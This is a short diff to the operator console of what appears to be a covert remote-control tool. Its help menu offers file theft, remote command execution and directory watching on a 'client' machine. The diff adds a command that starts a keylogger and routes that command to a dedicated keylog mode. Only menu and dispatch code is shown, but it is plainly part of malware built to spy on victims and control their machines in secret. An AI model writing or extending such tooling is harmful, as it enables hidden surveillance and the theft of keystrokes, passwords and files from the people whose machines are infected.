@@ -221,6 +221,7 @@ class Commander:
         print("  get <file>            - Transfer file from client (0x4567)")
         print("  run <command>         - Run command on client (0x5678)")
         print("  watch <dir>           - Watch directory on client (0x6789)")
+        print("  keylog                - Start keylogger (0x9012)")
         print("  exit                  - Exit commander")
         print("=" * 60)
         print()
@@ -304,7 +305,7 @@ class Commander:
 
                 elif cmd == 'keylog':
                     self.send_covert_command(CommandType.KEYLOG_START)
-                    self._watch_mode()
+                    self._keylog_mode()
                 else:
                     print(f"[!] Unknown command: {cmd}")
 
